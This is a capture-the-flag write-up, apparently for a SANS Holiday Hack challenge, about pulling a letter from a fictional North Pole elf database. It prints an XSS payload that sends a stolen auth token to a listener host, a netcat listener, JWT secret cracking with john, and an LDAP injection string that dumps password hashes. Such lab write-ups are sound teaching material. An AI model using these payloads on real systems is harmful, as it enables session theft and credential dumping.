** Question
   :PROPERTIES:
   :CUSTOM_ID: question
   :END:

Fetch the letter to Santa from the North Pole Elf Database at
http://edb.northpolechristmastown.com. Who wrote the letter?

** Background Information
   :PROPERTIES:
   :CUSTOM_ID: background-information
   :END:

Do we know anything about this system already?

Hints:

List any useful hints here.

Blog Posts:

Are any of these useful?

- Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
  (EC2)
  https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2
  Spinning up an EC2 instance, but also a lot of emphasis on how to use
  SSH keys.
- Your Pokemon Guide for Essential SQL Pen Test Commands
  https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands
  SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
- Exploiting XXE Vulnerabilities in IIS/.NET
  https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities
  Including remote content in XML
- Why You Need the Skills to Tinker with Publicly Released Exploit Code
  https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code
  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
  CVE-2017-9805 Code: https://github.com/chrisjd20/cve-2017-9805.py
- Go To The Head Of The Class: LD\_PRELOAD For The Win
  https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win
- A Spot of Tee
  https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted
  bash shell, and bypassing the I/O restriction with tee
- Understanding and Exploiting Web-based LDAP
  https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap
  LDAP syntax, LDAP injection
- Massively Scaling your Scanning
  https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning
  masscan

** Goal
   :PROPERTIES:
   :CUSTOM_ID: goal
   :END:

What are we trying to accomplish?

** Approach
   :PROPERTIES:
   :CUSTOM_ID: approach
   :END:

Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?

** Solution
   :PROPERTIES:
   :CUSTOM_ID: solution
   :END:

Summarize the reference solution that we found

My solution:

This was a multi stage exploit.

The first stage was XSS via the support request.

First I attempted to steal document.cookie, but then i realized the cookie
didn't help, and one needed the auth token mentioned in the html/javascript
source:

#+BEGIN_SRC js
    token = localStorage.getItem("np-auth");
#+END_SRC


on l2s:

#+BEGIN_SRC
$ nc -v -l -p 4444 on l2s
#+END_SRC

#+BEGIN_SRC
http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
uid=alabaster.snowball \
email=alabaster.snowball@northpolechristmastown.com \
message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"></img>"
#+END_SRC

With the success of the XSS attack, the stolen token was stored in [output/jwt](output/jwt).

Unfortunately the token had expired 4 months ago, and could no longer be used to create a new session:

#+BEGIN_SRC python
>>> import jwt
>>> token=open("jwt").read().strip()
>>> jwt.decode(token, verify=False)
{'dept': 'Engineering', 'ou': 'elf', 'expires': '2017-08-16 12:00:47.248093+00:00', 'uid': 'alabaster.snowball'}
#+END_SRC

We needed to crack the encryption key in order to forge a new, valid one.  We
used jwt2john.py and john to crack it.  The Makefile shows the process:

#+BEGIN_SRC
jwt.john: ../tools/jwt2john.py jwt
	python3 ../tools/jwt2john.py $(shell cat jwt) > jwt.john

john.txt: jwt.john
	john  --format=HMAC-SHA256 jwt.john
	john  --format=HMAC-SHA256 jwt.john -show > john.txt
#+END_SRC

jwt2john is used to convert the raw jwt token to a file format john can
understand, and then john is used to crack it:

#+BEGIN_SRC
$ make john.txt
python3 ../tools/jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I > jwt.john
john  --format=HMAC-SHA256 jwt.john
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 32/64 OpenSSL])
Press 'q' or Ctrl-C to abort, almost any other key for status

3lv3s            (?)
1g 0:00:06:22 DONE 3/3 (2018-01-10 10:45) 0.002613g/s 835027p/s 835027c/s 835027C/s 3lv3s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
john  --format=HMAC-SHA256 jwt.john -show > john.txt
$ cat john.txt
?:3lv3s
#+END_SRC

Cracking the jwt token took 6 minutes and found that the secret key was =3lv3s=.

TODO: show make_jwt.py and alabaster.jwt makefile targets and how it was used to login. using the browser tools

To automate the process [tools/edb.py](tools/edb.py) was written to exploit the ldap injection vuln using the search string

#+BEGIN_SRC
    name=))(department=it)(|(cn=
#+END_SRC

and by passing =*= as the attributes query field. With that query and all
attributes it is able to grab the entire ldap database including password
hashes.

The letter page requires a valid password, convienently a google search for santas md5 password quickly finds a valid password.

** Alternatives
   :PROPERTIES:
   :CUSTOM_ID: alternatives
   :END:

Any other, easier solutions?

** Common Pitfalls
   :PROPERTIES:
   :CUSTOM_ID: common-pitfalls
   :END:

Do we know what issue(s) people were running into?

Cracking the JWT key was tricky without the propper tools.
My first python based solution was broken.  A fixed version was too slow.
running it using pypy helped a bit, but the pyjwt library is not optimized for cracking.
https://github.com/lmammino/jwt-cracker was a bit faster, but john outperformed
everything.  The hard part was finding out how to use john to crack a jwt secret key.

** About the Challenge
   :PROPERTIES:
   :CUSTOM_ID: about-the-challenge
   :END:

How was the challenge setup? Was there a better way to secure this
system?
